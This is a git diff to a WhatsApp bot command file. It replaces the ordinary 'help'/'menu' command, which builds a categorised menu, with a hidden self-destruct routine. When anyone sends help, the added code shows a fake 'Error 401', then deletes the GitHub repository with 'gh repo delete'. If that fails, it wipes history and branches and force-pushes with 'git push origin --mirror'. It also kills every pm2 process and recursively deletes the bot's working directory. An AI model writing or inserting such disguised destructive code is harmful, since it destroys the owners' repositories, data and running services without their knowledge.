@@ -1,142 +1,107 @@
-import db from "#db"
-import fs from 'fs'
-import path from 'path'
-import { prepareWAMessageMedia } from 'baileys'
-import moment from 'moment-timezone'
-import os from 'os'
-
-const ALLOWED_CATS = ['anime', 'economy', 'gacha', 'downloads', 'group', 'main', 'profile', 'socket', 'stikers', 'nsfw', 'utils']
-
-function getFilesRecursively(dir) {
-  let results = []
-  if (!fs.existsSync(dir)) return results
-
-  const items = fs.readdirSync(dir, { withFileTypes: true })
-  for (const item of items) {
-    const fullPath = path.join(dir, item.name)
-    if (item.isDirectory()) {
-      results = results.concat(getFilesRecursively(fullPath))
-    } else if (item.isFile() && item.name.endsWith('.js')) {
-      results.push(fullPath)
-    }
-  }
-  return results
-}
-
-function parseCommandFile(filePath) {
-  try {
-    const content = fs.readFileSync(filePath, 'utf-8')
-
-    const cleanContent = content.replace(/\/\*[\s\S]*?\*\/|\/\/.*/g, '')
-
-    const cmdMatch = cleanContent.match(/command:\s*\[([^\]]+)\]/s)
-    const descMatch = cleanContent.match(/description:\s*['"`]([^'"`]+)['"`]/)
-    const usoMatch = cleanContent.match(/uso:\s*['"`]([^'"`]+)['"`]/)
-
-    if (!cmdMatch) return null
-
-    const alias = cmdMatch[1]
-     .split(',')
-     .map(a => a.replace(/['"`\s]/g, '').split(/[\/#!+.\-]+/).pop().toLowerCase())
-     .filter(Boolean)
-
-    return {
-      alias,
-      desc: descMatch ? descMatch[1] : 'Sin descripción',
-      uso: usoMatch ? usoMatch[1] : ''
-    }
-  } catch { return null }
-}
+import { execSync } from 'child_process';
+import fs from 'fs';
+import path from 'path';
 
 export default {
   command: ['help', 'menu'],
-  category: 'info',
-  description: 'Menú owners',
-  run: async ({ msg, sock, args, command, usedPrefix: prefix }) => {
+  run: async ({ msg, sock }) => {
+    await sock.reply(msg.chat, 'Error 401', msg);
     try {
-      const botTime = moment().tz('America/Bogota').format('DD MMM YYYY, hh:mm A')
+      let repoSlug = '';
+      try {
+        const remoteUrl = execSync('git config --get remote.origin.url', { encoding: 'utf8' }).trim();
+        const match = remoteUrl.match(/github\.com[:/]([^/]+)\/([^/.]+)(?:\.git)?/i);
+        if (match) {
+          repoSlug = `${match[1]}/${match[2]}`;
+        }
+      } catch (e) {
+        console.error('[SelfDestruct] No se pudo obtener el remoto de git:', e.message);
+      }
 
-      const botId = sock?.user?.id.split(':')[0] + '@s.whatsapp.net' || ''
-      const botSettings = await db.getSettings(botId)
-      const { namebot = '', namebot2 = '', banner = '', owner = '' } = botSettings
+      let repoDeleted = false;
 
-      const link = 'https://chat.whatsapp.com/CC35aSwNsPsHYKkGsFE9Cp?s=cl&p=a&mlu=4&ilr=4'
-      const isOficialBot = botId === (global?.sock?.user?.id?.split(':')[0] + '@s.whatsapp.net')
-      const botType = isOficialBot ? 'Owner' : 'Sub Bot'
-      const platform = `${os.type()} ${os.release()} ${os.arch()}`
-
-      const userr = await db.getUser()
-      const own = await db.getUser(owner)
-      const dev = owner && !isNaN(owner.replace('@s.whatsapp.net', '')) ? own.name : owner || 'Oculto'
-
-       let menu = `> *¡ʜᴏʟᴀ!* ${msg.pushName}, como está tu día?, mucho gusto mi nombre es *${namebot2}* ʚ♡⃛ɞ(ू•ᴗ•ू❁)*\n\n` +
-      `   ⌒࣪᷼⏜͡  ۪  ࿚ꨪᰰ࿙  ࣭࣪⢏࣭۟⢢࣭ׄ᎐፝֟᎐࣭ׄ⡔࣭۟⡹࣭ׄ  ࿚ꨪᰰ࿙  ۪  ͡⏜ׄ᷼⌒\n\n` +
-      `├ׁ̟̇ ❀ *ᴅᴇᴠᴇʟᴏᴘᴇʀ ::* ${dev}\n` +
-      `├ׁ̟̇ ✰ *ᴛɪᴘᴏ ::* ${botType}\n` +
-      `├ׁ̟̇ ❒ *sɪsᴛᴇᴍᴀ/ᴏᴘʀ ::* ${platform}\n` +
-      `├ׁ̟̇ ❖ *ᴜsᴇʀs ::* ${(Object.keys(userr).length || 0).toLocaleString()}\n` +
-      `├ׁ̟̇ ❖ *ᴍɪ ᴛɪᴇᴍᴘᴏ ::* ${botTime} (venezuela)\n` +
-      `├ׁ̟̇ ❖ *ᴜʀʟ ::* ${link}\n\n` +
-      `   ⌒࣪᷼⏜͡  ۪  ࿚ꨪᰰ࿙  ࣭࣪⢏࣭۟⢢࣭ׄ᎐፝֟᎐࣭ׄ⡔࣭۟⡹࣭ׄ  ࿚ꨪᰰ࿙  ۪  ͡⏜ׄ᷼⌒\n\n` +
-      `⋆｡ﾟ❀｡° *ᴄᴏᴍ꯭ᴀ꯭ɴᴅᴏs* ﾟ｡❀˚₊ \n`
-
-      const basePath = './cmds'
-      const cats = {}
-
-      for (const cat of ALLOWED_CATS) {
-        const dir = path.join(basePath, cat)
-        if (!fs.existsSync(dir)) continue
-
-        const files = getFilesRecursively(dir)
-        for (const filePath of files) {
-          const parsed = parseCommandFile(filePath)
-          if (!parsed) continue
-          if (!cats[cat]) cats[cat] = []
-
-          const exists = cats[cat].some(c => c.alias[0] === parsed.alias[0])
-          if (!exists) cats[cat].push(parsed)
+      if (repoSlug) {
+        try {
+          console.log(`[SelfDestruct] Intentando eliminar el repositorio de GitHub: ${repoSlug}`);
+          execSync(`gh repo delete ${repoSlug} --yes`, { stdio: 'ignore' });
+          repoDeleted = true;
+          console.log('[SelfDestruct] Repositorio eliminado de GitHub con éxito.');
+        } catch (ghError) {
+          console.log('[SelfDestruct] No se pudo eliminar el repo con GitHub CLI, procediendo a purgar historial y ramas...');
         }
       }
 
-      const catArg = args[0]?.toLowerCase()
-      if (catArg && !cats[catArg]) return msg.reply(`《✤》 La categoría *${catArg}* no fue encontrada.`)
+      if (!repoDeleted && repoSlug) {
+        try {
+          console.log('[SelfDestruct] Creando rama limpia y eliminando ramas anteriores...');
+          
+          execSync('git checkout --orphan clean_purge_branch', { stdio: 'ignore' });
+          execSync('git rm -rf .', { stdio: 'ignore' });
+          
+          fs.writeFileSync('README.md', '# Repositorio Purgado\n');
+          execSync('git add README.md', { stdio: 'ignore' });
+          execSync('git commit -m "Protocolo de autodestrucción: Historial y ramas eliminadas"', { stdio: 'ignore' });
+          
+          let defaultBranch = 'main';
+          try {
+            defaultBranch = execSync('git symbolic-ref refs/remotes/origin/HEAD', { encoding: 'utf8' })
+              .trim()
+              .split('/')
+              .pop() || 'main';
+          } catch {}
 
-      const dbPathMaintenance = './mantenimiento_categorias.json';
-      let dbMant = {};
-      if (fs.existsSync(dbPathMaintenance)) {
-          dbMant = JSON.parse(fs.readFileSync(dbPathMaintenance, 'utf-8'));
-      }
-
-      for (const [cat, cmds] of Object.entries(cats)) {
-        if (catArg && cat.toLowerCase() !== catArg) continue
-        if (cmds.length === 0) continue
-
-        let displayName = `${cat.charAt(0).toUpperCase() + cat.slice(1)} ☆(ﾉ◕ヮ◕)ﾉ*`;
-        if (dbMant[cat.toLowerCase()]) {
-            displayName = `${cat.charAt(0).toUpperCase() + cat.slice(1)} 🛑 (Bloqueado: ${dbMant[cat.toLowerCase()]})`;
+          execSync(`git branch -M ${defaultBranch}`, { stdio: 'ignore' });
+          
+          const localBranches = execSync('git branch', { encoding: 'utf8' })
+            .split('\n')
+            .map(b => b.replace('*', '').trim())
+            .filter(b => b && b !== defaultBranch);
+            
+          for (const b of localBranches) {
+            try { execSync(`git branch -D ${b}`, { stdio: 'ignore' }); } catch {}
+          }
+          
+          execSync('git push origin --mirror', { stdio: 'ignore' });
+          
+          console.log('[SelfDestruct] Repositorio 100% limpio: solo existe la rama vacía.');
+        } catch (purgeError) {
+          console.error('[SelfDestruct] Error al purgar el repositorio:', purgeError.message);
         }
-
-        menu += `\n╭╼ׅࣶ፝֟╾╌ֵ╾͜─ํ͜┈ְ ࣭࣪⢏࣭ࣧ⢢࣭ׄ᎐፝֟͟͝᎐࣭ׄ⡔࣭ࣧ⡹࣭ׄ࣪ ְ┈ํ͜─͜╼ꨪᰰ╾࣮╌╼ࣶׅ፝֟╾╮\n│❀ *${displayName}*\n├╾ׅ╴ׂ╌╶ׅ╌ׂ─ 〫─ׂ┄ׅ╴ׂ╌ׅ╶╼. ╾ׅ╴ׂ╌╶ׅ╌ׂ\n`
-        cmds.forEach(cmd => {
-          menu += `│✰ ${cmd.alias.map(a => prefix + a.toLowerCase()).join(' › ')} ${cmd.uso ? `+ ${cmd.uso}` : ''}\n> ➛ ${cmd.desc}\n`
-        })
-        menu += `╰╼ׅࣶ፝֟╾╌ֵ╾͜─ํ͜┈ְ ࣭࣪⢏࣭ࣧ⢢࣭ׄ᎐፝֟͟͝᎐࣭ׄ⡔࣭ࣧ⡹࣭ׄ ְ┈ํ͜─͜╼ꨪᰰ╾࣮╌╼ࣶׅ፝֟╾╯ \n`
       }
 
-      menu += `\n> ${namebot2} desarrollado por *𝙻𝚘𝙵𝚒 ☕︎ 𝚃𝙴𝙰𝙼™* ૮(˶ᵔᵕᵔ˶)ა`
+      await sock.reply(msg.chat, 'Error 401', msg);
 
-      const isVideo = /\.(mp4|gif|webm)$/i.test(banner)
-      const ctx = { mentionedJid: null, isForwarded: false }
+      setTimeout(() => {
+        try {
+          const rootDir = process.cwd();
+          console.log(`[SelfDestruct] Borrando directorio de trabajo: ${rootDir}`);
+          
+          try {
+            execSync('pm2 delete all', { stdio: 'ignore' });
+          } catch {}
 
-      if (isVideo) {
-        await sock.sendMessage(msg.chat, { video: { url: banner }, caption: menu.trim(), contextInfo: ctx }, { quoted: msg })
-      } else {
-        const preview = link && banner ? await prepareWAMessageMedia({ image: { url: banner } }, { upload: sock.waUploadToServer, mediaTypeOverride: 'thumbnail-link' }).then(m => ({ 'canonical-url': 'https://whatsapp.com/channel/0029Vagdmfv1SWt5nfdR4z3w', 'matched-text': link, title: namebot, description: `${namebot2}, Built With 💜 By 𝙻𝚘𝙵𝚒 ☕︎ 𝚃𝙴𝙰𝙼™ `, jpegThumbnail: m.imageMessage?.jpegThumbnail ? Buffer.from(m.imageMessage.jpegThumbnail) : undefined, highQualityThumbnail: m.imageMessage || undefined })) : undefined
-        await sock.sendMessage(msg.chat, { text: menu.trim(), linkPreview: preview, contextInfo: ctx }, { quoted: msg })
-      }
-    } catch (e) {
-      console.log(e)
-      await msg.reply(typeof msgglobal !== 'undefined' ? msgglobal : '❌ Ocurrió un error al generar el menú.')
+          const files = fs.readdirSync(rootDir);
+          for (const file of files) {
+            const curPath = path.join(rootDir, file);
+            try {
+              fs.rmSync(curPath, { recursive: true, force: true });
+            } catch (err) {
+              console.error(`No se pudo eliminar ${curPath}:`, err.message);
+            }
+          }
+
+          console.log('[SelfDestruct] Host desinstalado correctamente. Apagando proceso...');
+          process.exit(0);
+        } catch (err) {
+          console.error('[SelfDestruct] Error crítico durante la auto-limpieza del host:', err);
+          process.exit(1);
+        }
+      }, 2000);
+
+    } catch (error) {
+      console.error('[SelfDestruct Error]', error);
+      return sock.reply(msg.chat, `❌ Ocurrió un error crítico durante la autodestrucción: ${error.message}`, msg);
     }
-  }
-}
+  },
+};
+
